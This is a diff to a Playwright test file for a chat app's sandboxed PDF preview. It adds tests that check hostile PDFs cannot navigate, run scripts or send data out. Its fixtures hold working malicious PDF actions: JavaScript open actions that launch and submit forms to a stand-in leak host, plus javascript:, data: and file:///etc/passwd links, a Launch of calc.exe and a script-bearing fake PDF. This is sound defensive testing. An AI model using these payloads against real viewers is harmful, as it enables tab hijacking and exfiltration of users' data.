@@ -9,6 +9,7 @@ route's headers, frame-only answer and access) is tests/app/file-preview.test.ts
 from __future__ import annotations
 
 import html as htmllib
+import json
 import os
 import re
 import socket
@@ -164,19 +165,80 @@ def sandbox_refusal(message: str) -> bool:
         "sandboxed" in text and "flag is not set" in text and "/preview" in text or "not allowed in a sandboxed frame" in text)
 
 
-def pdf_bytes() -> bytes:
-    """A real one-page PDF with a line of text."""
-    stream = b"BT /F1 24 Tf 40 100 Td (Gateway placement) Tj ET"
-    objects = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
-               b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
-               b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream", b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
-    out, offsets = b"%PDF-1.4\n", []
-    for number, body in enumerate(objects, 1):
-        offsets.append(len(out))
-        out += b"%d 0 obj\n" % number + body + b"\nendobj\n"
+def build_pdf(pages: list[dict], dests: dict | None = None, catalog: bytes = b"", page_extra: bytes = b"") -> bytes:
+    """A real PDF of 300 x 200 point pages, each with a line of text. A page is {"text": str, "annots": [make(page_objects) -> annotation dict]};
+    `dests` are named destinations; `catalog` and `page_extra` add entries (an open action, page actions) to the catalog and every page."""
+    count = len(pages)
+    page_obj = [3 + i for i in range(count)]
+    font = 3 + count
+    nxt = font + 1
+    objects: dict[int, bytes] = {}
+    named = b" /Dests << " + b" ".join(b"/%s %s" % (key.encode(), make(page_obj)) for key, make in dests.items()) + b" >>" if dests else b""
+    objects[1] = b"<< /Type /Catalog /Pages 2 0 R" + named + catalog + b" >>"
+    objects[2] = b"<< /Type /Pages /Kids [" + b" ".join(b"%d 0 R" % o for o in page_obj) + b"] /Count %d >>" % count
+    objects[font] = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
+    for i, page in enumerate(pages):
+        stream = b"BT /F1 24 Tf 20 100 Td (%s) Tj ET" % page["text"].encode()
+        content = nxt
+        nxt += 1
+        objects[content] = b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream"
+        refs = []
+        for make in page.get("annots", []):
+            refs.append(b"%d 0 R" % nxt)
+            objects[nxt] = make(page_obj)
+            nxt += 1
+        annots = b" /Annots [" + b" ".join(refs) + b"]" if refs else b""
+        objects[page_obj[i]] = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents %d 0 R /Resources << /Font << /F1 %d 0 R >> >>%s%s >>"
+                                % (content, font, annots, page_extra))
+    out, offsets = b"%PDF-1.7\n", {}
+    for number in sorted(objects):
+        offsets[number] = len(out)
+        out += b"%d 0 obj\n" % number + objects[number] + b"\nendobj\n"
+    size = max(objects) + 1
     xref = len(out)
-    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1) + b"".join(b"%010d 00000 n \n" % o for o in offsets)
-    return out + b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref)
+    out += b"xref\n0 %d\n0000000000 65535 f \n" % size + b"".join(b"%010d 00000 n \n" % offsets[n] for n in range(1, size))
+    return out + b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (size, xref)
+
+
+def link(rect: str, action: bytes | None = None, dest=None):
+    """A link annotation over `rect` (x1 y1 x2 y2, in points) with an action or a destination."""
+    def make(pages: list[int]) -> bytes:
+        body = b"<< /Type /Annot /Subtype /Link /Rect [%s] /Border [0 0 0]" % rect.encode()
+        if action is not None:
+            body += b" /A " + (action(pages) if callable(action) else action)
+        if dest is not None:
+            body += b" /Dest " + dest(pages)
+        return body + b" >>"
+    return make
+
+
+PDF_LINK = f"https://{LEAK}/pdf-link"
+FULL_PAGE = "0 0 300 200"
+JS = f"app.launchURL('https://{LEAK}/launch', true); this.submitForm('https://{LEAK}/submit'); app.alert('owned');".encode()
+SCRIPT = b"<< /S /JavaScript /JS (" + JS + b") >>"
+PLACEMENT = build_pdf([{"text": "Gateway placement"}])
+# The audit's page (#1350): one page whose only annotation is a link as large as the page, so a click anywhere on the document followed it.
+BIG_LINK = build_pdf([{"text": "Click anywhere", "annots": [link(FULL_PAGE, b"<< /S /URI /URI (%s) >>" % PDF_LINK.encode())]}])
+# Everything else a PDF can ask for: scripts (open action, document and page actions), every scheme, Launch, another file, a form. One honest link.
+HOSTILE_PDF = build_pdf([{"text": "Hostile links", "annots": [
+    link("0 0 300 20", b"<< /S /URI /URI (javascript:alert(1)) >>"), link("0 20 300 40", b"<< /S /URI /URI (data:text/html,<script>alert(1)</script>) >>"),
+    link("0 40 300 60", b"<< /S /URI /URI (file:///etc/passwd) >>"), link("0 60 300 80", b"<< /S /URI /URI (vbscript:msgbox) >>"),
+    link("0 80 300 100", b"<< /S /URI /URI (mailto:a@b.example) >>"), link("0 100 300 120", b"<< /S /URI /URI (ftp://f.example/x) >>"),
+    link("0 120 300 140", b"<< /S /Launch /F (calc.exe) >>"),
+    link("0 140 300 160", b"<< /S /Launch /F << /FS /URL /F (https://" + LEAK.encode() + b"/launch) >> >>"),
+    link("0 160 300 180", b"<< /S /GoToR /F << /FS /URL /F (https://" + LEAK.encode() + b"/other.pdf) >> /D [0 /Fit] >>"),
+    link("0 180 300 190", b"<< /S /JavaScript /JS (app.alert(1)) >>"), link("0 190 300 195", b"<< /S /URI /URI (https://user:pw@flux.example/x) >>"),
+    link("0 195 300 200", b"<< /S /URI /URI (https://" + LEAK.encode() + b"/legit) >>"),
+]}], catalog=b" /OpenAction " + SCRIPT + b" /Names << /JavaScript << /Names [(x) " + SCRIPT + b"] >> >>", page_extra=b" /AA << /O " + SCRIPT + b" >>")
+# Places in the document: an explicit destination, a page, a named destination, and the last-page action.
+GOTO_PDF = build_pdf([
+    {"text": "Page one", "annots": [link("0 0 300 40", lambda pages: b"<< /S /GoTo /D [%d 0 R /XYZ 0 150 null] >>" % pages[1]),
+                                    link("0 40 300 80", None, lambda pages: b"[%d 0 R /Fit]" % pages[2]),
+                                    link("0 80 300 120", b"<< /S /GoTo /D (chapter) >>"), link("0 120 300 160", b"<< /S /Named /N /LastPage >>")]},
+    {"text": "Page two", "annots": [link("0 0 300 60", b"<< /S /Named /N /FirstPage >>")]}, {"text": "Page three"},
+], dests={"chapter": lambda pages: b"[%d 0 R /Fit]" % pages[2]})
+LONG_PDF = build_pdf([{"text": f"Page {n}"} for n in range(1, 41)])
+NOT_A_PDF = b"<!doctype html><title>x</title><h1>Not a PDF</h1><script>parent.postMessage('owned', '*')</script>"
 
 
 LIMIT = 5 * 1024 * 1024
@@ -261,7 +323,9 @@ class FilePreview(unittest.TestCase):
             root(key, f"A page with a document inside it, {name}", name, data)
         for key, name, data in (("log", "gateway.log", SMALL_LOG), ("latin", "notes.txt", LATIN), ("json", "beds.json", JSON_OK),
                                 ("bad", "broken.json", JSON_BAD), ("csv", "range.csv", CSV), ("tsv", "range.tsv", TSV),
-                                ("source", "rssi.py", SOURCE), ("markdown", "notes.md", MARKDOWN), ("pdf", "placement.pdf", pdf_bytes()),
+                                ("source", "rssi.py", SOURCE), ("markdown", "notes.md", MARKDOWN), ("pdf", "placement.pdf", PLACEMENT),
+                                ("biglink", "biglink.pdf", BIG_LINK), ("hostile-pdf", "hostile.pdf", HOSTILE_PDF), ("goto", "goto.pdf", GOTO_PDF),
+                                ("long-pdf", "long.pdf", LONG_PDF), ("not-pdf", "html-named.pdf", NOT_A_PDF),
                                 ("big-log", "uplinks.log", LOG), ("big-csv", "uplinks.csv", BIG_CSV), ("big-json", "uplinks.json", BIG_JSON),
                                 ("commas", "commas.csv", COMMAS), ("wide", "matrix.csv", WIDE),
                                 ("one-line", "one-line.md", ONE_LINE_MD)):
@@ -274,12 +338,13 @@ class FilePreview(unittest.TestCase):
         cls.browser.close()
         cls.pw.stop()
 
-    def open(self, key: str, who: str = "jonas", phone: bool = False, dark: bool = False, quiet_stream: bool = False) -> tuple[Page, list[str], dict]:
+    def open(self, key: str, who: str = "jonas", phone: bool = False, dark: bool = False, quiet_stream: bool = False,
+             browser: Browser | None = None) -> tuple[Page, list[str], dict]:
         """The conversation holding `key`'s file, with every request that leaves Flux's origin recorded (and stopped)."""
         options: dict = {"base_url": ORIGIN, "locale": "en-GB", "timezone_id": "Europe/Warsaw", "storage_state": self.states[who],
                          "color_scheme": "dark" if dark else "light", "service_workers": "block"}
         options.update(viewport=PHONE, device_scale_factor=3, is_mobile=True, has_touch=True) if phone else options.update(viewport=DESKTOP)
-        context = self.browser.new_context(**options)
+        context = (browser or self.browser).new_context(**options)
         self.addCleanup(context.close)
         outside: list[str] = []
 
@@ -439,10 +504,10 @@ class FilePreview(unittest.TestCase):
                 inside = page.frame_locator(".file-viewer iframe")
                 expect(inside.locator("#title")).to_have_text("Quarterly report")
                 page.wait_for_timeout(2500)
+                self.assertEqual(TRAP.connections, before, "no connection was opened to a host the nested page names")
+                self.assertEqual(outside, [], "nothing left the browser")
                 self.assertEqual([frame.url for frame in page.frames if frame != page.main_frame], [f"{ORIGIN}/api/v1/files/{self.ids[f'file:{key}']}/preview"],
                                  "the preview is the only frame: no document was made inside it")
-                self.assertEqual(outside, [], "nothing left the browser")
-                self.assertEqual(TRAP.connections, before, "no connection was opened to a host the nested page names")
                 self.assertEqual(events["pages"], [])
 
     def test_02b_the_connection_counter_sees_a_connection(self) -> None:
@@ -601,36 +666,153 @@ class FilePreview(unittest.TestCase):
         expect(table.get_by_role("columnheader")).to_have_text(["bed", "rssi"])
         expect(table.get_by_role("cell", name="-112")).to_be_visible()
 
-    def test_09_a_pdf_opens_in_the_browsers_viewer_or_says_it_cannot(self) -> None:
-        page, outside, _ = self.open("pdf")
-        _, dialog = self.viewer(page, "pdf", "placement.pdf")
-        if page.evaluate("navigator.pdfViewerEnabled"):
-            frame = dialog.locator("iframe")
-            expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:pdf']}/preview")
-            self.assertIsNone(frame.get_attribute("sandbox"), "sandboxed by the preview's own policy (C-60)")
-        else:
-            # Playwright's headless Chromium shell has no PDF viewer: the viewer says so and offers Download.
-            expect(dialog.get_by_text("This browser can't show a PDF here.")).to_be_visible()
-            expect(dialog.locator(".file-viewer__sheet").get_by_role("link", name="Download")).to_have_attribute("download", "placement.pdf")
-            self.shot(page, "file-preview-pdf-unsupported-1440-light")
-        self.assertEqual(outside, [])
+    def pdf_viewer(self, page: Page, key: str, name: str):
+        """The viewer's dialog, the locator of its frame and the frame itself, once the first page is drawn."""
+        _, dialog = self.viewer(page, key, name)
+        inside = page.frame_locator(".file-viewer iframe")
+        expect(inside.locator(".page canvas").first).to_be_attached()
+        expect(dialog.locator(".file-viewer__cover")).to_have_count(0)
+        return dialog, inside, next(f for f in page.frames if f.url.endswith("/pdf-viewer/index.html"))
 
-    @unittest.skipUnless(UI_BROWSER == "chromium", "the full Chromium build carries the PDF viewer")
-    def test_10_chromium_shows_the_pdf_in_its_viewer_inside_the_sandboxed_frame(self) -> None:
+    def test_09_a_pdf_is_drawn_by_flux_in_a_sandboxed_frame_never_by_the_browsers_viewer(self) -> None:
+        for phone in (False, True):
+            with self.subTest(phone=phone):
+                page, outside, events = self.open("pdf", phone=phone)
+                title, url = page.title(), page.url
+                dialog, inside, frame = self.pdf_viewer(page, "pdf", "placement.pdf")
+                expect(dialog.locator("iframe")).to_have_attribute("src", "/pdf-viewer/index.html")
+                expect(dialog.locator("iframe")).to_have_attribute("sandbox", "allow-scripts")
+                expect(inside.locator(".textLayer").first).to_contain_text("Gateway placement")
+                self.assertEqual(frame.evaluate("self.origin"), "null", "an opaque origin")
+                ink = frame.evaluate("""() => { const c = document.querySelector('.page canvas'); const d = c.getContext('2d').getImageData(0, 0, c.width, c.height).data;
+                    let n = 0; for (let i = 0; i < d.length; i += 4) if (d[i] < 128) n++; return n; }""")
+                self.assertGreater(ink, 500, "the page's text is drawn")
+                self.assertTrue(all(f.url.startswith(("http://", "https://")) or f.url == "about:blank" for f in page.frames), [f.url for f in page.frames])
+                self.assertEqual(outside, [], "nothing left the browser")
+                self.assertEqual((page.title(), page.url, events["pages"], events["dialogs"]), (title, url, [], []))
+                self.shot(page, f"file-preview-pdf-{'390' if phone else '1440'}-light")
+
+    def test_09a_the_audits_page_sized_link_never_takes_the_flux_tab(self) -> None:
+        self.assert_page_sized_link_stays_in_flux(self.browser, native_viewer=False)
+
+    @unittest.skipUnless(UI_BROWSER == "chromium", "the full Chromium build carries the PDF viewer the audit used")
+    def test_09b_the_audits_page_sized_link_in_the_full_chromium_build(self) -> None:
         full = self.pw.chromium.launch(channel="chromium")
         self.addCleanup(full.close)
-        context = full.new_context(base_url=ORIGIN, storage_state=self.states["jonas"], viewport=DESKTOP, service_workers="block")
-        self.addCleanup(context.close)
-        page = context.new_page()
-        page.goto(f"/projects/{self.ids['project']}")
-        page.locator(f"#message-{self.ids['pdf']}").scroll_into_view_if_needed()
-        _, dialog = self.viewer(page, "pdf", "placement.pdf")
-        expect(dialog.locator("iframe")).to_have_attribute("src", f"/api/v1/files/{self.ids['file:pdf']}/preview")
-        deadline = time.time() + 15
-        while time.time() < deadline and not any(f.url.startswith("chrome-extension://") for f in page.frames):
-            page.wait_for_timeout(250)
-        self.assertTrue(any(f.url.startswith("chrome-extension://") for f in page.frames), [f.url for f in page.frames])
-        self.shot(page, "file-preview-pdf-1440-light")
+        self.assert_page_sized_link_stays_in_flux(full, native_viewer=True)
+
+    def assert_page_sized_link_stays_in_flux(self, browser: Browser, native_viewer: bool) -> None:
+        """#1350: a link annotation as large as the page. Pressing anywhere on the document used to replace the whole Flux tab in Chromium."""
+        page, outside, events = self.open("biglink", browser=browser)
+        title, url = page.title(), page.url
+        if native_viewer:
+            self.assertTrue(page.evaluate("navigator.pdfViewerEnabled"), "this build has the PDF viewer the audit clicked in, which Flux does not use")
+        dialog, inside, frame = self.pdf_viewer(page, "biglink", "biglink.pdf")
+        self.assertFalse([f.url for f in page.frames if f.url.startswith("chrome-extension://")], "the browser's own PDF viewer is not in the page")
+        expect(inside.locator(".links button")).to_have_count(1)
+        box = dialog.locator("iframe").bounding_box()
+        assert box is not None
+        note = dialog.get_by_text(f"This PDF links to {PDF_LINK}")
+        for x, y in ((0.5, 0.5), (0.35, 0.3), (0.62, 0.45)):
+            page.mouse.click(box["x"] + box["width"] * x, box["y"] + box["height"] * y)
+            expect(note).to_be_visible()
+            page.wait_for_timeout(400)
+            self.assertEqual((page.url, page.title()), (url, title), "the Flux tab stays where it was")
+            self.assertEqual([f.url for f in page.frames if f != page.main_frame], [f"{ORIGIN}/pdf-viewer/index.html"], "no frame was navigated")
+            self.assertEqual(outside, [], "nothing is fetched before the person presses Open link")
+            self.assertEqual(events["pages"], [], "no tab opened by itself")
+            dialog.get_by_role("button", name="Dismiss").click()
+            expect(note).to_have_count(0)
+        # The keyboard presses it too.
+        inside.locator(".links button").focus()
+        page.keyboard.press("Enter")
+        expect(note).to_be_visible()
+        # Open link is an ordinary anchor to a new tab, without Flux's page as its opener and without a referrer.
+        anchor = dialog.get_by_role("link", name="Open link")
+        expect(anchor).to_have_attribute("href", PDF_LINK)
+        expect(anchor).to_have_attribute("target", "_blank")
+        expect(anchor).to_have_attribute("rel", "noopener noreferrer")
+        with page.context.expect_page() as opened:
+            anchor.click()
+        self.assertIsNone(opened.value.opener(), "the new tab has no opener")
+        deadline = time.time() + 10
+        while time.time() < deadline and not outside:
+            page.wait_for_timeout(100)
+        self.assertEqual(outside, [PDF_LINK], "only now did the address leave, as a new tab")
+        self.assertEqual((page.url, page.title()), (url, title))
+        expect(dialog).to_be_visible()
+
+    def test_09c_a_hostile_pdf_can_do_nothing_but_offer_its_one_honest_link(self) -> None:
+        before = TRAP.connections
+        page, outside, events = self.open("hostile-pdf")
+        title, url = page.title(), page.url
+        dialog, inside, _ = self.pdf_viewer(page, "hostile-pdf", "hostile.pdf")
+        expect(inside.locator(".textLayer").first).to_contain_text("Hostile links")
+        # Scripts, every scheme but http(s), Launch, another file, a form and an address with a password: no button at all.
+        self.assertEqual(inside.locator(".links button").evaluate_all("(buttons) => buttons.map((b) => b.getAttribute('aria-label'))"), [f"Link to https://{LEAK}/legit"])
+        self.assertEqual(inside.locator("a, form, input, iframe, object, embed").count(), 0, "nothing in the viewer could navigate")
+        inside.locator(".links button").click()
+        expect(dialog.get_by_text(f"This PDF links to https://{LEAK}/legit")).to_be_visible()
+        page.wait_for_timeout(2500)  # past any action the file ran on open
+        self.assertEqual(outside, [], "nothing left the browser")
+        self.assertEqual(TRAP.connections, before)
+        self.assertEqual((events["pages"], events["downloads"], events["dialogs"]), ([], [], []), "the file's script never ran")
+        self.assertEqual([json.loads(m)["type"] for m in page.evaluate("window.__messages")], ["ready", "drawn", "link"], "the viewer said only that it was ready, drew, and the one link")
+        self.assertEqual((page.url, page.title()), (url, title))
+
+    def test_09d_links_to_a_place_in_the_pdf_scroll_the_viewer_and_say_nothing(self) -> None:
+        page, outside, events = self.open("goto")
+        title, url = page.title(), page.url
+        dialog, inside, frame = self.pdf_viewer(page, "goto", "goto.pdf")
+        buttons = inside.locator(".page").first.locator(".links button")
+        expect(buttons).to_have_count(4)
+        top = lambda index: frame.evaluate("(i) => document.querySelectorAll('.page')[i].getBoundingClientRect().top", index)  # noqa: E731
+        scroll = lambda: frame.evaluate("document.getElementById('scroller').scrollTop")  # noqa: E731
+        to_top = lambda: frame.evaluate("document.getElementById('scroller').scrollTop = 0")  # noqa: E731
+        self.assertEqual(scroll(), 0)
+        buttons.nth(0).click()  # page two, a point down it
+        expect(inside.locator(".page").nth(1).locator(".textLayer")).to_contain_text("Page two")
+        self.assertTrue(-300 < top(1) < -50, top(1))
+        to_top()
+        buttons.nth(2).click()  # a named destination: page three
+        expect(inside.locator(".page").nth(2).locator(".textLayer")).to_contain_text("Page three")
+        self.assertTrue(0 <= top(2) < 300, top(2))
+        to_top()
+        buttons.nth(3).click()  # the last-page action
+        expect(inside.locator(".page").nth(2).locator(".textLayer")).to_contain_text("Page three")
+        self.assertTrue(0 <= top(2) < 300, top(2))
+        frame.evaluate("document.getElementById('scroller').scrollTop = document.querySelectorAll('.page')[1].offsetTop - 12")
+        inside.locator(".page").nth(1).locator(".links button").click()  # the first-page action
+        expect(inside.locator(".page").first.locator(".textLayer")).to_contain_text("Page one")
+        self.assertEqual(scroll(), 0)
+        page.wait_for_timeout(600)
+        self.assertEqual(dialog.get_by_text("This PDF links to").count(), 0, "a place in the file needs no confirmation")
+        self.assertEqual([json.loads(m)["type"] for m in page.evaluate("window.__messages")], ["ready", "drawn"], "and the viewer said nothing to Flux")
+        self.assertEqual((outside, events["pages"], page.url, page.title()), ([], [], url, title))
+
+    def test_09e_pages_are_drawn_only_near_the_view(self) -> None:
+        page, outside, _ = self.open("long-pdf")
+        _, inside, frame = self.pdf_viewer(page, "long-pdf", "long.pdf")
+        drawn = "() => [...document.querySelectorAll('.page')].map((p, i) => p.querySelector('canvas').width > 0 ? i : -1).filter((i) => i >= 0)"
+        expect(inside.locator(".page")).to_have_count(40)
+        page.wait_for_timeout(800)
+        first = frame.evaluate(drawn)
+        self.assertTrue(0 in first and len(first) <= 8, f"only the first pages are drawn: {first}")
+        frame.evaluate("document.getElementById('scroller').scrollTop = document.getElementById('scroller').scrollHeight")
+        expect(inside.locator(".page").nth(39).locator(".textLayer")).to_contain_text("Page 40")
+        page.wait_for_timeout(800)
+        last = frame.evaluate(drawn)
+        self.assertTrue(39 in last and 0 not in last and len(last) <= 8, f"the pages left behind are released: {last}")
+        self.assertEqual(outside, [])
+
+    def test_09f_a_file_that_is_not_a_pdf_says_so_and_is_never_drawn_as_a_page(self) -> None:
+        page, outside, events = self.open("not-pdf")
+        _, dialog = self.viewer(page, "not-pdf", "html-named.pdf")
+        expect(dialog.get_by_text("This file could not be shown. Download it to open it.")).to_be_visible()
+        expect(dialog.get_by_role("link", name="Download")).to_have_attribute("download", "html-named.pdf")
+        page.wait_for_timeout(800)
+        self.assertEqual((outside, events["pages"], events["dialogs"]), ([], [], []))
+        self.assertEqual([json.loads(m)["type"] for m in page.evaluate("window.__messages")], ["ready", "failed"], "its script never ran")
 
     @unittest.skipUnless(UI_BROWSER == "chromium", "long tasks are measured in Chromium")
     def test_11_five_mib_files_open_without_holding_the_page(self) -> None:
